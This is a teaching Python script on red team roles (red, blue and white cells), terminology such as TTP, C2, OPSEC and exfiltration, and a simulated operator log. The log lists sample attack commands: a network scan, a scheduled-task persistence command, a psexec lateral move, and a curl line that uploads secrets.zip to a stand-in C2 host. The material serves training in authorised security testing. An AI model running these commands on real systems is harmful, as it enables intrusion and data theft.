"""
RED TEAM ROLES, OPERATIONS & KEY TERMINOLOGY

A red team operation is a coordinated exercise with defined roles on both sides.
Think of it like a military exercise — everyone has a position and responsibility.

THE THREE CELLS:
  Red Cell   = attackers (operators executing TTPs)
  Blue Cell  = defenders (SOC, blue team, IT — unaware of the test)
  White Cell = referee  (neutral, controls rules, prevents real damage)
"""

import datetime, json

# ── ROLES ─────────────────────────────────────────────────────────────────────

ROLES = {
    "Red Team Lead": {
        "cell": "Red",
        "responsibilities": [
            "Plans the engagement — scope, timeline, rules of engagement",
            "Allocates operators to tasks",
            "Ensures legal compliance and authorization",
            "Briefs leadership on findings",
            "Signs off on every action taken",
        ],
        "analogy": "Mission commander — approves every move before it happens",
    },
    "Red Team Operator": {
        "cell": "Red",
        "responsibilities": [
            "Executes TTPs during the operation",
            "Specializes: initial access / persistence / lateral movement / exfil / C2",
            "Maintains detailed operator log (oplog) for every command run",
            "Practices OPSEC — minimizes detection footprint",
            "Reports situational awareness back to lead in real time",
        ],
        "analogy": "Field agent — executes on the ground, logs everything",
    },
    "White Cell": {
        "cell": "White (neutral)",
        "responsibilities": [
            "Acts as referee — enforces rules of engagement",
            "Steps in if an operator is about to cause real damage",
            "Controls which systems are in/out of scope during the operation",
            "Mediates disputes between red and blue teams",
            "Typically appointed by the organization being tested",
        ],
        "analogy": "Referee at a sparring match — enforces rules, stops real injury",
    },
    "Blue Cell": {
        "cell": "Blue",
        "responsibilities": [
            "SOC analysts monitoring for intrusion (unaware of red team)",
            "Incident responders handling any alerts that fire",
            "System owners who may see anomalies",
            "Trusted agents: a few insiders who know the test is happening",
        ],
        "analogy": "Home team defending their own goal — tested under real conditions",
    },
}

print("=== RED TEAM ROLES ===\n")
for role, data in ROLES.items():
    print(f"  [{data['cell']} Cell]  {role}")
    print(f"    Analogy: {data['analogy']}")
    for r in data["responsibilities"][:3]:
        print(f"    • {r}")
    print()

# ── KEY TERMINOLOGY ───────────────────────────────────────────────────────────

TERMINOLOGY = {
    "TTP": "Tactics, Techniques, Procedures — the HOW of an attack. Tactic=goal, Technique=method, Procedure=specific implementation",
    "Tradecraft": "The specific skills, methods, and techniques used by operators during a campaign. Includes OPSEC practices.",
    "C2 (Command & Control)": "Infrastructure the attacker uses to communicate with compromised systems. E.g. Cobalt Strike, Sliver, Havoc C2 frameworks.",
    "Oplog (Operator Log)": "Timestamped log of every command an operator runs. CRITICAL for deconfliction and post-engagement reporting.",
    "OPSEC": "Operational Security. Steps taken to minimize detection: clean artifacts, use encrypted C2, blend into normal traffic.",
    "IOC": "Indicator of Compromise. Artifacts defenders use to detect attacks: IP addresses, file hashes, registry keys, domains.",
    "Exfiltration": "Covertly extracting data from the target. Done slowly and in small chunks to evade DLP (Data Loss Prevention) tools.",
    "CTI": "Cyber Threat Intelligence. Analyzed information about adversaries — their TTPs, infrastructure, targets. Feeds red team scenarios.",
    "Situational Awareness": "Ongoing process of understanding the compromised environment: what defenses exist, user behavior, network topology.",
    "Operational Impact": "The effect of an action. Operators must assess impact BEFORE acting — avoid unintended damage or detection.",
    "Assumed Breach": "Engagement type that starts with access already inside. Tests lateral movement + impact without testing initial access.",
    "Dwell Time": "How long an attacker is inside the network before detection. Industry avg: 207 days (IBM 2023). Red team measures this.",
    "MTTD": "Mean Time to Detect. How fast the blue team spots the attack. Red team target: make this number uncomfortably small.",
    "MTTR": "Mean Time to Respond. How fast the blue team contains + evicts after detection. Both MTTD and MTTR are KPIs.",
    "Purple Team": "Red + Blue working together. Red executes a technique, Blue measures if/when they detected it. Closes detection gaps.",
}

print("=== KEY TERMINOLOGY ===\n")
for term, definition in TERMINOLOGY.items():
    print(f"  {term:<28} {definition[:80]}")
    if len(definition) > 80:
        print(f"  {'':<28} {definition[80:]}")
    print()

# ── Operator Log (Oplog) simulation ──────────────────────────────────────────

def oplog_entry(operator, action, command, target, result, detected=False):
    return {
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "operator":  operator,
        "action":    action,
        "command":   command,
        "target":    target,
        "result":    result,
        "detected":  detected,
        "opsec_risk": "LOW" if not detected else "HIGH",
    }

print("=== OPERATOR LOG (Oplog) — what operators record for every action ===\n")
sample_oplog = [
    oplog_entry("op1", "recon",      "nmap -sV 10.0.1.0/24",              "internal network", "found 3 open hosts"),
    oplog_entry("op1", "exploit",    "SQLi on /api/login",                 "10.0.1.5:443",     "got admin session token"),
    oplog_entry("op2", "persistence","schtasks /create /tn updater /tr c2","10.0.1.5",         "scheduled task created"),
    oplog_entry("op2", "lateral",    "psexec \\\\10.0.1.8 -u admin",       "10.0.1.8",         "DETECTED by EDR", detected=True),
    oplog_entry("op1", "exfil",      "curl -T secrets.zip https://c2.io",  "10.0.1.5",         "200 OK, 14KB exfiltrated"),
]

for entry in sample_oplog:
    flag = " ← DETECTED" if entry["detected"] else ""
    print(f"  {entry['timestamp'][11:19]}  [{entry['action']:<12}]  {entry['command'][:45]}{flag}")

print("""
WHY OPLOGS MATTER:
  1. Deconfliction — blue team triggers an alert; oplog proves it was the red team
  2. Reporting     — exact timeline of what happened for the post-engagement report
  3. Legal cover   — proves every action was authorized and documented
  4. Replay        — can reconstruct the full attack chain for purple team follow-up
  Modern C2 frameworks (Cobalt Strike, Sliver) auto-generate oplogs.
""")
